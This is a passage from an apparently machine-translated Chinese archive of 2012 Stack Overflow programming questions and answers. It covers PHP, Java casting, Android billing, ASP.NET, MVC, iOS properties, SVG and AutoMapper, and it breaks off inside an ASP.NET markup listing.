你可以使用双引号

```
$list = array
(
"$name", "$email",
); 
```

并且由于这些字符串仅包含您的变量，因此只需一起跳过引号

```
$list = array
(
$name, $email,
); 
```

有关更多文档，请参阅[文档](http://php.net/manual/en/language.types.string.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:26:19.450

错误消息告诉您出了什么问题：该函数`split()`已弃用，这意味着它已过时（旧的，将在 PHP 的未来更新中停用）并且 PHP 会警告您不要使用它。

[PHP 的在线手册可`split()`](http://us.php.net/split)帮助您找到其他功能来实现您想要的功能，例如`explode()`或`preg_split()`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:27:22.973

正如您的错误和该函数的 php 手册中所述， http: [//php.net/manual/en/function.split.php](http://php.net/manual/en/function.split.php)

> 自 PHP 5.3.0 起，该函数已被弃用。强烈建议不要依赖此功能。

`Deprecated`=> 此功能**不再适用**于您的 PHP 版本。

正如@Felix 建议的那样，使用`explode()`而不是`split()`，阅读爆炸：[http ://php.net/manual/en/function.explode.php](http://php.net/manual/en/function.explode.php)

所以，而不是：

```
foreach ($list as $line)
  {
  fputcsv($file,split(',',$line));
  } 
```

做：

```
foreach ($list as $line)
  {
  fputcsv($file,explode(',',$line));
  } 
```

# oop - 允许类转换吗？

> ID：12146500
> 
> 赞同：0
> 
> 时间：2012-08-27T17:20:02.753
> 
> 标签：oop, class, casting, type-conversion

我有2节公开课；人和工程师。Engineer 继承自 Person 类。现在在 main() 我有一个人对象说

```
Person abc = new Person(); 
```

我正在尝试将“abc”转换为工程师，即

```
Engineer xyz = (Engineer) abc; 
```

***问：***这合法吗？我的理解是我不能这样做，因为“abc”可能具有不同的属性。

***代码：***

```
public class Person { 
      private String firstname; 
      private String lastname; 
      private String gender; 

      public Person(String first, String last, String gen) { 
            firstname = first; 
            lastname = last; 
            gender = gen; 
      } 

      public void setFirstName(String name) { 
            firstname = name; 
      } 

      public void setLastName(String name) { 
            lastname = name; 
      } 

      public void setGender(String gen) { 
            gender = gen; 
      } 

      public String getFirstName() { 
            return firstname; 
      } 

      public String getLastName() { 
            return lastname; 
      } 

      public String getGender() { 
            return gender; 
      } 

     public toString() { 
            return "firstname=" + firstname + "lastname=" + lastname + "gender=" + gender; 
} 

public class SoftwareEngineer extends Person { 
      public String teamname; 
      public String bestlanguage; 

      public SoftwareEngineer(String first, String last, String gen, String team, String lang) { 
            firstname = first; 
            lastname = last; 
            gender = gen; 
            teamname = team; 
            bestlanguage = lang; 
      } 

     public toString() { 
            return "firstname=" + firstname + "lastname=" + lastname + "gender=" + gender + "teamname=" + teamname + "bestlanguage=" + bestlanguage; 

} 

public void main() { 
SoftwareEngineer aaron = new SoftwareEngineer('Aaron','Gottlieb','M','IPSupport','SQL'); 
Person andy = new SoftwareEngineer('Andy','Gardner','M','IP','Java'); 
Person pete = new Person("Pete", "G", "M"); 

Person personAaron = aaron; 
SoftwareEngineer sePete = (SoftwareEngineer) pete; 
SoftwareEngineer seAndy = (SoftwareEngineer) andy; 
pete.teamname = "FooBar"; 
aaron.setLastName("Brian"); 

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:24:40.683

每个*工程师*都是一个*人*，但不是每个*人*都是*工程师*。现在将其翻译到您的 OO 域。你认为你总是可以投到`Person`吗`Engineer`？即假设每个*人*都是*工程师*？

不，但你可以问*人*：*你是工程师吗？*：

```
if(abc instanceof Engineer) {
  Engineer xyz = (Engineer) abc;
} 
```

但你不必总是知道这一点。你可以问*每个*人的名字，不管那个人是不是工程师：

```
Person p = new Engineer();
p.getFirstName(); 
```

# django - 在没有 websocket 的情况下在 Django 中保持连接打开

> ID：12146501
> 
> 赞同：0
> 
> 时间：2012-08-27T17:20:03.060
> 
> 标签：django, websocket, long-polling

我有一台不支持 websocket 的迷你电脑，我想从服务器接收推送通知。

问题是客户端连接到服务器后，服务器响应然后关闭连接。这使得客户端必须不断地重新连接到服务器以获取新信息。

有没有办法使用 Django 让连接保持打开状态，然后让服务器将数据发布到客户端？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:34:09.003

Django 主要是一个请求/响应框架，因此不支持真正的双工通信。

Socket.IO 是事实上的库，它使类似 websocket 的功能跨浏览器 (IE5.5+)，如果浏览器允许，则使用真正的 websockets 作为传输，如果没有，则回退到 HTTP 长轮询或其他任何东西'吨。有关将 Socket.IO 与 Django 集成的各种选项，请阅读[此](https://stackoverflow.com/questions/4190186/can-i-use-socket-io-with-django)。

# android - Android 应用内计费，如何处理应用重新安装

> ID：12146508
> 
> 赞同：5
> 
> 时间：2012-08-27T17:20:33.680
> 
> 标签：android, android-billing

我对应用内计费的工作方式感到非常困惑。我已经阅读了文档，但我一定错过了一些东西，因为我不明白我需要在我的应用程序中实现以使其工作的最后一步。应用内计费非常有效，但是，如果用户卸载我的应用并在未来再次安装它，我的应用程序不知道如何确定应用内购买是否以前进行过。这是我的主要课程的一个片段，我试图处理所有这些：

```
@Override
public void onCreate(Bundle savedInstanceState)
{
    mContext = this;
    startService(new Intent(mContext, BillingService.class));
    BillingHelper.setCompletedHandler(mTransactionHandler);
} 
```

我正在使用地牢示例项目中的示例类。我不明白下面的代码在购买时是如何工作的，但是重新运行它并不能检查是否已经购买了一些东西。我已经在这部分停留了大约一个月，对此我感到非常沮丧。

```
public Handler mTransactionHandler = new Handler()
{
    public void handleMessage(android.os.Message msg)
    {
        Log.i(TAG, "Transaction complete");
        Log.i(TAG, "Transaction status: "
            + BillingHelper.latestPurchase.purchaseState);
        Log.i(TAG, "Item purchased is: "
            + BillingHelper.latestPurchase.productId);

        if (BillingHelper.latestPurchase.isPurchased())
        {
            new Message("Thank you!", getApplicationContext());
            PAY_VERSION = true;
            SharedPreferences purchasePreferences = getSharedPreferences(PURCHASE_PREFERENCES, Activity.MODE_PRIVATE);
            Editor purchaseEditor = purchasePreferences.edit();
            purchaseEditor.putBoolean("purchased", PAY_VERSION);
            purchaseEditor.commit();
            Intent intent = getIntent();
            finish();
            startActivity(intent);
        }
    }; 
```

我需要的是某种方式来查询服务器以查看该项目是否已购买。我知道`PURCHASE_STATE_CHANGED`某处有东西，但是当它确定状态已更改或如何启动它进行检查时，我不知道如何做任何事情。我迷路了，我所需要的只是朝着正确的方向努力，因为到目前为止我完全迷路了。

编辑：

我还听说您需要解析 JSON，但我什至不知道如何开始这样做。

编辑2：

我应该打电话给这些东西检查吗？

```
BillingHelper.restoreTransactionInformation(BillingSecurity.generateNonce());
BillingHelper.getPurchaseInformation(new String[] {"myItem"}); 
```

该代码以前在我姐妹的电话 ( `SGS3`, `ICS`) 上崩溃了，但在我的 ( `GN`,`ICS`和`JB`work) 上没有。`onCreate()`我在我的第一个活动中调用它。不知道`getPurchaseInformation(...)`一旦它被调用后该怎么办。它没有返回值，所以我不确定我是否可以解析`JSON`或我应该做的任何事情......

另外，这两行给了我这个：

```
08-27 11:54:04.271: E/BillingService(17702): BillingHelper not fully instantiated
08-27 11:54:04.271: E/BillingService(17702): BillingHelper not fully instantiated 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-29T23:31:01.943

您在第二次更新中走在了正确的轨道上。诀窍是要意识到一切都是异步完成的。

典型流程如下：

1.  用户安装您的应用程序。

2.  首次加载应用时，您会检查是否需要恢复购买。

3.  如果这样做，请向 Google 发送 RESTORE_TRANSACTION 同步请求。

4.  Google 将对您的 RESTORE_TRANSACTION 请求作出确认响应。（这**只是确认**他们收到了您的请求。）

5.  此时，您应该标记您已经向 Google 发送了恢复请求，并且不需要从应用程序发送进一步的恢复。

6.  现在，对于用户之前购买的每个应用内购买，Google 将开始**异步向您的应用发送“PURCHASE_STATE_CHANGED”事件。**如果用户第一次购买，该调用与 Google 发送的调用**相同。**

7.  由于它是同一个调用，您的应用程序将接收事件并正常处理它，就好像用户刚刚购买了应用程序内产品一样（从而“恢复”购买的功能）。

关于第 2 步和第 5 步，我为我的应用程序所做的是保留一个名为“APP_INITIALISED”的 SharedPreference 值，该值默认为 false。每次我的应用启动时，如果“APP_INITIALISED”为假，我会告诉 Google RESTORE_TRANSACTION（第 2 步），然后我将 APP_INITIALISED 设置为真（第 5 步）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-28T19:51:31.973

### JSON

下面显示了一个包含订阅购买令牌的 JSON 订单对象的示例。

```
{ "nonce" : 1836535032137741465,

  "orders" :
    [{ "notificationId" : "android.test.purchased",
       "orderId" : "transactionId.android.test.purchased",
       "packageName" : "com.example.dungeons",
       "productId" : "android.test.purchased",
       "developerPayload" : "bGoa+V7g/yqDXvKRqq+JTFn4uQZbPiQJo4pf9RzJ",
       "purchaseTime" : 1290114783411,
       "purchaseState" : 0,
       "purchaseToken" : "rojeslcdyyiapnqcynkjyyjh" }]
} 
```

如何`JSON`在[Java](http://www.mkyong.com/java/json-simple-example-read-and-write-json/)中解析。

`Android` [支持](http://www.vogella.com/articles/AndroidJSON/article.html) `JSON`库

### 安卓计费

如果您有远程服务器，我们建议您将购买信息存储在您的服务器上，而不是存储在设备上的本地数据库中。[看这里](http://developer.android.com/guide/google/play/billing/billing_integrate.html)。

阅读有关[按用户帐户托管、非托管或订阅的信息](http://developer.android.com/guide/google/play/billing/billing_admin.html#billing-catalog)

我使用这样的计费方式：

1.  在 onCreate

    ```
     BillingHelper.setCompletedHandler(handlerTransaction); 
    ```

    您的代码中有处理程序。

2.  下一个`onClick`或什么

    ```
     BillingHelper.requestPurchase(this, currentMarketProduct.getMarketId()); 
    ```

# c# - 如何维护复选框的状态？

> ID：12146509
> 
> 赞同：-1
> 
> 时间：2012-08-27T17:20:39.967
> 
> 标签：c#, asp.net, vb.net

我在gridview中有一个复选框列表。

您可以检查一个，也可以检查任意多个，最多 10 个。

在分页应用程序中选中一个或多个框后，您将分页到下一页，这些框未选中。

如何保持选中的框保持选中状态，直到用户取消选中它们？

我下面的代码不起作用。

```
For Each r As GridViewRow In GridMaks.Rows
    If CType(r.Cells(0).FindControl("makos"), CheckBox).Checked Then
        Dim marko As String = baseHint & "&cup=" & r.Cells(4).Text
        CType(r.Cells(0).FindControl("marko"), CheckBox).Checked = True '// added this hoping to keep checkbox checked but it doesn't work
    End If
Next 
```

很抱歉包含 2 种口味的 c# 和 vb.net。如果有帮助，我可以将 c# 转换为 vb。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:37:37.860

如果每次加载页面时都将数据绑定到网格，则复选框将不会保留，因为它们正在被重置。尝试像下面的简单示例代码一样执行检查，以仅在请求**不是**回发时绑定数据。

```
if (IsPostBack) { 
    // It is a postback, don't bind data
} else { 
    // It is not a postback, bind data
} 
```

此外，您可能会发现这篇关于[Persisting checkbox state while paging](http://www.highoncoding.com/Videos/697_Persisting_CheckBox_State_While_Paging_in_GridView_Control.aspx)对您的需要很有帮助的文章。在 GridView 的“PageChanging”事件中，文章说将**选中**复选框的每一行的行索引存储在 List 中，然后将该 List 存储在 ViewState 中。当页面更改时，从 ViewState 中检索该列表并重新填充 GridView 复选框。

# c# - 传入字典的模型项是''类型的，但是这个字典需要一个''类型的模型项

> ID：12146519
> 
> 赞同：2
> 
> 时间：2012-08-27T17:21:01.147
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3, razor

我正在尝试进入 mvc 技术，并且正在阅读 apress 的“pro asp.net mvc 3 framework”一书。我卡在一个地方，我现在不知道如何解决它，因为这与普通的 Web 表单有很大不同。这是我得到的错误：**传递到字典中的模型项的类型是“System.Data.Entity.Infrastructure.DbQuery`1[SportsStore.Domain.Entities.Product]”，但是这个字典需要一个模型项类型'SportsStore.WebUI.Models.ProductsListViewModel'。**

我不知道我需要粘贴哪些代码，但这就是我所拥有的：

看法：

```
@model SportsStore.WebUI.Models.ProductsListViewModel           
@{
    ViewBag.Title = "Products";
}

<h2>List</h2>

@foreach (var s in Model.Products)
{
    <div class="item">
    <h3>@s.Name</h3>
    @s.Description
    <h4>@s.Price.ToString("c")</h4>
    </div>    
}

<div class="pager">
@Html.PageLinks(Model.PagingInfo, x => Url.Action("List", new { page = x }));
</div> 
```

产品控制器：

```
namespace SportsStore.WebUI.Controllers
{
    public class ProductController : Controller
    {
        public int PageSize = 4;
        private IProductsRepository repository;

        public ProductController(IProductsRepository productsRepository)
        {
            repository = productsRepository;
        }

        public ViewResult List(int page=1)
        {
            ProductsListViewModel viewModel = new ProductsListViewModel
            {
                Products = repository.Products
                .OrderBy(p => p.ProductID)
                .Skip((page - 1) * PageSize)
                .Take(PageSize),
                PagingInfo = new PagingInfo
                {
                    CurrentPage = page,
                    ItemsPerPage = PageSize,
                    TotalItems = repository.Products.Count()
                }
            };
            return View(repository.Products.OrderBy(p => p.ProductID).Skip((page - 1) * PageSize).Take(PageSize));
        }       
    }    
} 
```

如果您需要更多信息，请告诉我。谢谢，拉齐尔

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-27T17:23:50.893

改变这个：

```
return View(repository.Products.OrderBy(p => p.ProductID).Skip((page - 1) * PageSize).Take(PageSize)); 
```

对此：

```
return View(viewModel); 
```

您的页面需要一个 type 的模型`SportsStore.WebUI.Models.ProductsListViewModel`。您正在从数据存储库中创建此视图模型的实例，但在创建后没有对其进行任何操作。MVC 感到困惑，因为您发送到视图的模型与预期的不同。我只是将退货更改为使用`viewModel`您在退货之前已经在行中创建的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:25:00.343

您的视图模型是 a `ProductListViewModel`，根据您视图中的这一行：

```
@model SportsStore.WebUI.Models.ProductsListViewModel 
```

但是，您将通过此处的这一行从 Controller 返回不同的类型：

```
return View(repository.Products.OrderBy(p => p.ProductID).Skip((page - 1) * PageSize).Take(PageSize)); 
```

为了使它们匹配，您需要从控制器返回 ProductListViewModel，因此您可能需要执行以下操作：

```
ProductListViewModel vm = new ProductListViewModel(repository.Products.OrderBy(p => p.ProductID).Skip((page - 1) * PageSize).Take(PageSize));
return View(vm); 
```

# iphone - NSURLConnection 异步调用并返回数据到另一个类方法：iOS 5, iPhone

> ID：12146520
> 
> 赞同：0
> 
> 时间：2012-08-27T17:21:09.240
> 
> 标签：iphone, ios5, asynchronous, nsurlconnection

我正在从一个类进行异步 NSURLConnection 调用。我想将从异步调用接收到的数据返回给另一个类的方法。

在接收异步响应时，我正在调用另一个类方法并将接收到的数据作为参数传递。不幸的是，aysnc 调用被触发了多次:(

如何将从异步调用接收到的数据传递给另一个类方法？

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:34:43.770

想法1）使其他类成为连接的委托并在那里实现委托协议。

想法2）连接didFinish和didFail每个连接只会被调用一次。在 didFinish 上，您可以获取您在 didReceive 上收集的数据，并将其一次全部传递给其他类。

# android - 使用 onResume 方法重启 Activity

> ID：12146522
> 
> 赞同：9
> 
> 时间：2012-08-27T17:21:24.513
> 
> 标签：android, android-activity

我想用 onResume() 方法重新启动一个活动。我以为我可以使用 Intent 来实现这一点，但这以无限循环结束。

```
@Override
protected void onResume() {
    Intent intent = new Intent(MainActivity.this, MainActivity.class);
    MainActivity.this.startActivity(intent);
    finish();
    super.onResume();
} 
```

是否有另一种方法来重新启动活动？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-27T17:26:27.143

我会质疑你为什么要这样做......但这是我想到的第一件事：

```
@Override
protected void onCreate(Bundle savedInstanceState) {
    ...
    Log.v("Example", "onCreate");
    getIntent().setAction("Already created");
}

@Override
protected void onResume() {
    Log.v("Example", "onResume");

    String action = getIntent().getAction();
    // Prevent endless loop by adding a unique action, don't restart if action is present
    if(action == null || !action.equals("Already created")) {
        Log.v("Example", "Force restart");
        Intent intent = new Intent(this, Example.class);
        startActivity(intent);
        finish();
    }
    // Remove the unique action so the next time onResume is called it will restart
    else
        getIntent().setAction(null);

    super.onResume();
} 
```

您应该`"Already created"`设置唯一，以免其他 Intent 意外执行此操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-07-12T12:08:05.070

只需在您的 onResume() 中使用它

`@Override protected void onResume() { recreate(); }`

# php - 使用 form_input 通过 URL 传递信息？

> ID：12146526
> 
> 赞同：0
> 
> 时间：2012-08-27T17:21:42.313
> 
> 标签：php, codeigniter

我正在尝试使用 form_input 调用此“搜索”方法：

```
-- controller
function search($item_to_search, $page_to_display)
{
    //do this and that
}

-- view
<?php
    echo form_open("admin/admin_product_c/search/[words come here]/0"); <-- no clue what to do here..
    echo form_input('search_data', 'Type the words to search');
    //submit button here
?> 
```

有没有办法在单击提交按钮时填写并完成 form_open 以便我可以通过 URL 传递值？如果可能的话，我想避免在这种情况下使用 Session / POST ，因为将事物保持在一种格式确实对我有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:39:55.567

在这里查看我的答案：

[如何在codeigniter中制作动态表单动作地址？](https://stackoverflow.com/questions/12070107/how-to-make-dynamic-form-action-address-in-codeigniter/12070284#12070284)

您可以选择两种解决方案 - 使用或不使用 JavaScript，我认为第二种适合您。

# svg - 符号中的 SVG 模式

> ID：12146529
> 
> 赞同：0
> 
> 时间：2012-08-27T17:21:52.537
> 
> 标签：svg, symbols

我的svg有问题。我想创建一个将多边形（这里是六边形）及其背景图像（作为图案）分组的符号：

```
 <symbol id="tile" viewBox="0 0 240 208">
        <defs>
            <pattern id="img1" patternUnits="userSpaceOnUse" width="240" height="208">
                <image xlink:href="ground.png" x="0" y="0" width="240" height="208" />
            </pattern>
        </defs>
        <polygon class="tile" fill="url(#img1)" 
                points="60 0, 180 0, 240 104, 180 208, 60 208, 0 104" />
    </symbol> 
```

`<use>`我通过标签包含符号。问题是背景图像`ground.png`不可见（六边形被填充为黑色）。

我究竟做错了什么？

**编辑：http:** [//jsfiddle.net/wuR3G/3/](http://jsfiddle.net/wuR3G/3/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T18:24:28.967

你没有做错什么。您的测试用例在 Opera 中工作。`<defs>`Firefox 有一个关于内部的现有错误，`<symbol>`因此您必须为它重新构建您的示例：

```
<svg width="600" height="624" xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 600 624">
    <script type="text/ecmascript" xlink:href="svg.js" />
    <title>Base</title>
    <desc>Hexagon base maptile</desc>
    <defs>
        <pattern id="img1" patternUnits="userSpaceOnUse" width="240" height="208">
            <image xlink:href="https://www.google.de/images/srpr/logo3w.png" x="0" y="0" width="240" height="208" />
        </pattern>
        <symbol id="tile" viewBox="0 0 240 208">
            <polygon class="tile" fill="url(#img1)"
                    points="60 0, 180 0, 240 104, 180 208, 60 208, 0 104" />
        </symbol>
    </defs>
    <use xlink:href="#tile" x="0" y="0" width="240" height="208" />
</svg> 
```

# iphone - iOS：使用超类的 getter 和 setter 的属性不再适用于 Xcode 4.4

> ID：12146530
> 
> 赞同：0
> 
> 时间：2012-08-27T17:21:53.353
> 
> 标签：iphone, objective-c, ios, xcode, properties

在引用子类中的 getter 和 setter 时，我遇到了属性问题：

在基类中，我有一个名为 listItems 的属性，带有一个自定义设置器：

```
@interface BaseList{
    NSArray *_listItems;
}
@property (nonatomic, retain) NSArray *listItems;
@end

@implementation BaseList
@synthesize listItems = _listItems;

-(void)setListItems:(NSArray *)listItems
{
    [_listItems release];
    _listItems = [listItems retain];
    //... some logic
}
@end 
```

子类有一个属性，该属性具有更具体的 listItems 名称，例如地址：

```
@interface AddressList
@property (nonatomic, retain, getter = listItems, setter = setListItems:) NSArray *addresses;
@end 
```

AddressList 的实现中没有合成addresses 属性，因为它应该使用super 的listItems 属性的getter 和setter。但是，设置后：

```
self.addresses = [NSArray array]; 
```

财产仍然为零。有趣的是，我相信这适用于早期版本的 Xcode。我目前正在使用 Xcode 4.4 (4.4.1)，我不确定我是否只是做错了，或者某些与属性相关的东西在这种情况下是否发生了变化。如果有人能告诉我如何正确地做到这一点，我将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:34:54.347

Apple 改变了在 Xcode 4.4 中合成访问器的方式。您不再需要声明 ivar，也无需合成访问器。当然，您仍然*可以*声明自己的 ivars 和合成器，但既然您不这样做，编译器就会为您做这件事。

您可以改为使用`@dynamic`来抑制这种情况。

您可以在 Build Settings 中打开一个名为**Implicit Synthesized Properties**的警告。打开它以暂时获得有关为您合成的所有访问器的警告。

> 从 Xcode 4.4 开始，Apple LLVM 编译器将隐式合成未使用 @synthesize 显式合成的属性。此警告警告此类隐式行为，即使该属性仍是合成的。这本质上是一个向后兼容性警告，或者对于那些希望继续明确使用@synthesize 的人。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:30:57.787

In your `AddressList` implementation, add `@dynamic addresses;`. This will make it so xcode doesn't automatically generate anything for you anymore. Right now Xcode is generating `-listItems` and `setListItems:` methods that refer to an auto-generated instance variable `_addresses`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:30:37.647

Okay, this is interesting.

First off, remove the ivar _listItems from your declaration of BaseList. synthesize creates that ivar for you, possibly causing a duplicate name error.

I see you decided to override the synthesized setter...technically at least. Try to change the method name to setlistItems (small L). That way, whenever you call self.listItems = x, it will call your custom setter.

Try adding that synthesize. Otherwise, the variable might as well not exist at all. In my opinion at least. Sorry if that isn't that helpful.

# php - 如何使用 Rackspace CloudFiles PHP API 设置文件过期标头

> ID：12146538
> 
> 赞同：0
> 
> 时间：2012-08-27T17:22:28.250
> 
> 标签：php, rackspace

我目前正在编写一个 php 备份脚本，它将网站及其 mysql 数据库备份到 Rackspace CloudFiles。我的脚本运行良好，但我不知道如何设置过期标头，以便在 7 天后自动删除备份。据我所知，Rackspace 并没有很好地记录 PHP API。

这是我正在尝试做的，参考他们的常规 API 文档。

[http://docs.rackspace.com/files/api/v1/cf-devguide/content/Expiring_Objects-e1e3228.html](http://docs.rackspace.com/files/api/v1/cf-devguide/content/Expiring_Objects-e1e3228.html)

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T15:29:41.520

我认为您只需将 X-Delete-At 标头添加到文件中即可。

```
$object->headers = array('X-Delete-At'=> 1339429105); // unix timestamp
$obj->sync_metadata(); 
```

# asp.net-mvc-3 - 消除对 UrlHelper 的依赖？

> ID：12146540
> 
> 赞同：1
> 
> 时间：2012-08-27T17:22:36.123
> 
> 标签：asp.net-mvc-3, castle-windsor, automapper

我有一个`AutoMapper`当前依赖于`UrlHelper`以下映射的配置文件：

```
CreateMap<Post, OpenGraphModel>().ForMember(
    m => m.Title,
    x => x.MapFrom(p => p.Link.Title)
).ForMember(
    m => m.Description,
    x => x.MapFrom(p => p.Link.Description)
).ForMember(
    m => m.Image,
    x => x.MapFrom(p => p.Link.Picture)
).ForMember(
    m => m.Url,
    x => x.MapFrom(p => urlHelper.RouteUrl("PostShortcut", new { id = p.Id }, "http"))
); 
```

这很好，直到我想`AutoMapper`在 Web 请求之外的上下文中重用我的个人资料。

我可以为此想到三个解决方案，但没有一个能真正说服我（没有特定的顺序）：

1.  **从映射配置文件中完全删除`UrlHelper`依赖项。**在我看来，
    这意味着我现在必须手动映射 的`Url`属性`OpenGraphModel`，这违背了使用的目的。`AutoMapper`我喜欢我的映射器能够在目标对象中设置我需要的所有属性。

2.  **从非 Web 上下文中删除此映射配置文件，因为非 Web 请求上下文不应该直接映射到视图模型。**
    为了实现这一点，我必须让我的`IMapper`实例是瞬态的，每个 Web 请求（或线程），而不是单例，这会引入我不想引入的额外开销。

3.  第三种选择是不在`IMapper`非 Web 请求上下文（即作业）上使用实现，但这似乎几乎不可能，因为我正在重用最终需要我使用映射器的组件。

我想拥有**两个单例映射器**将是**最有意义**的一个（根据上下文选择配置文件），但我不知道我应该如何做到这一点，这是我的 AutoMapper 安装程序的当前形式：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using AutoMapper;
using AutoMapper.Mappers;
using Castle.MicroKernel;
using Castle.MicroKernel.Registration;
using Castle.MicroKernel.SubSystems.Configuration;
using Castle.Windsor;

namespace Common
{
    internal sealed class AutoMapperInstaller : IWindsorInstaller
    {
        private readonly Type[] profileTypes;

        public AutoMapperInstaller(params Type[] profileTypes)
        {
            if (profileTypes == null)
            {
                throw new ArgumentNullException("profileTypes");
            }
            this.profileTypes = profileTypes;
        }

        public void Install(IWindsorContainer container, IConfigurationStore store)
        {
            IEnumerable<Assembly> assemblies = profileTypes.Select(t => t.Assembly).ToList();

            foreach (Assembly assembly in assemblies)
            {
                container.Register(
                    AllTypes
                        .FromAssembly(assembly)
                        .BasedOn(typeof (ITypeConverter<,>))
                        .WithServiceSelf()
                    );
            }

            foreach (Assembly assembly in assemblies)
            {
                container.Register(
                    Classes
                        .FromAssembly(assembly)
                        .BasedOn<Profile>()
                        .LifestyleTransient()
                    );
            }

            container.Register(
                Component
                    .For<ITypeMapFactory>()
                    .ImplementedBy<TypeMapFactory>()
                    .LifestyleTransient()
                );

            container.Register(
                Component
                    .For<IConfiguration, IConfigurationProvider>()
                    .UsingFactoryMethod(InstanceConfigurationStore)
                    .LifestyleTransient()
                );

            container.Register(
                Component
                    .For<IMappingEngine>()
                    .ImplementedBy<MappingEngine>()
                    .LifestyleTransient()
                );

            container.Register(
                Component
                    .For<IMapper>()
                    .ImplementedBy<Mapper>()
                    .DynamicParameters(
                        (k, parameters) => parameters["profileTypes"] = profileTypes
                    )
                    .LifestyleSingleton()
                );
        }

        private ConfigurationStore InstanceConfigurationStore(IKernel kernel)
        {
            ITypeMapFactory typeMapFactory = kernel.Resolve<ITypeMapFactory>();
            IEnumerable<IObjectMapper> mappers = MapperRegistry.AllMappers();

            return new ConfigurationStore(typeMapFactory, mappers);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T15:26:13.450

通过在非 Web 请求上下文中模拟`RequestContext`传递给来解决。`UrlHelper`

# ruby - 防病毒阻止exe文件被提取？

> ID：12146542
> 
> 赞同：1
> 
> 时间：2012-08-27T17:22:37.580
> 
> 标签：ruby, exe, antivirus, devkit

我想为 ruby​​ 提取 devkit。它是一个 7zip 存档，但没有提取一个文件“mv.exe”，即使我在存档中重命名它，它也不会运行，提取并将其重命名回“mv.exe”。

是我的 Mcafee 安全/防病毒软件还是其他一些操作系统配置？

它在我的家用电脑上工作，但办公室电脑给了我这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:26:40.160

这可能是一个误报。如果防病毒软件有此选项，您可以在这种情况下添加例外。如果没有，您可以在提取时禁用防病毒软件，然后重新启用它。

# asp.net - ASP.NET - 表单上的默认按钮，只有下拉菜单和按钮

> ID：12146545
> 
> 赞同：1
> 
> 时间：2012-08-27T17:22:48.023
> 
> 标签：asp.net

我有一个 ASP.NET 页面，其中包含列表视图中的一些下拉列表。表单底部是一个提交按钮。

每当用户点击“Enter”键时，我都希望按下提交按钮。我已经在具有面板的 DefaultButton 属性的其他表单上完成了此操作，但这些表单在面板中有一个文本框和一个按钮。

这里的defaultbutton属性并没有触发提交按钮，我想是因为焦点不在面板中。

但是，如果我让面板包含所有元素，这似乎也不起作用。我认为这是因为 html 表格布局元素。

那么当用户在键盘上按下“Enter”时，简单按下提交按钮的答案是什么？

```
<table cellpadding="3" cellspacing="1" border="0" width="100%">
    <tr>
        <td align="center" width="100%" class="tableCaptionLabel" colspan="2">
        Asset Search by Photo
        </td>
    </tr>
    <tr valign="top">
        <td colspan="2">

        <asp:ListView ID="lvQuery" runat="server" >
            <LayoutTemplate>
            <asp:Placeholder
            id="groupPlaceholder"
            runat="server" />
            </LayoutTemplate>
            <GroupTemplate>
            <div>
            <asp:Placeholder
            id="itemPlaceholder"
            runat="server" />
            </div>
            </GroupTemplate>
            <ItemTemplate>
            <asp:DropDownList ID="tagname" runat="server" DataSourceID="sqldsTagList" SelectedValue='<%# Bind("Tagname") %>'
                    DataTextField="TagDesc" DataValueField="TagDesc"  AppendDataBoundItems ="true" AutoPostBack="true" OnSelectedIndexChanged="lstTagname_SelectedIndexChanged">
                    <asp:ListItem Text="All" Value="All" />
            </asp:DropDownList>

               <asp:DropDownList ID="Operation" runat="server" SelectedValue='<%# Bind("Operation") %>' AutoPostBack="true" OnSelectedIndexChanged="lstOperation_SelectedIndexChanged">
                    <asp:ListItem Text="Equals" Value="Equals" Selected="True"/>
                    <asp:ListItem Text="Like" Value="Like"  />
               </asp:DropDownList>

            <asp:TextBox ID="TagValue" runat="server" Text='<%# Bind("TagValue") %>' Width="75%"></asp:TextBox>

            <asp:DropDownList ID="ddlAlphabet" runat="server" Visible="false" AutoPostBack="true" OnSelectedIndexChanged="lstAlphabet_SelectedIndexChanged">
                <asp:ListItem Text="A" Value="A" Selected="True"/>
                <asp:ListItem Text="B" Value="B"  />
                <asp:ListItem Text="C" Value="C"  />
                <asp:ListItem Text="D" Value="D"  />
                <asp:ListItem Text="E" Value="E"  />
                <asp:ListItem Text="F" Value="F"  />
                <asp:ListItem Text="G" Value="G"  />
                <asp:ListItem Text="H" Value="H"  />
                <asp:ListItem Text="I" Value="I"  />
                <asp:ListItem Text="J" Value="J"  />
                <asp:ListItem Text="K" Value="K"  />
                <asp:ListItem Text="L" Value="L"  />
                <asp:ListItem Text="M" Value="M"  />
                <asp:ListItem Text="N" Value="N"  />
                <asp:ListItem Text="O" Value="O"  />
                <asp:ListItem Text="P" Value="P"  />
                <asp:ListItem Text="Q" Value="Q"  />
                <asp:ListItem Text="R" Value="R"  />
                <asp:ListItem Text="S" Value="S"  />
                <asp:ListItem Text="T" Value="T"  />
                <asp:ListItem Text="U" Value="U"  />
                <asp:ListItem Text="V" Value="V"  />
                <asp:ListItem Text="W" Value="W"  />
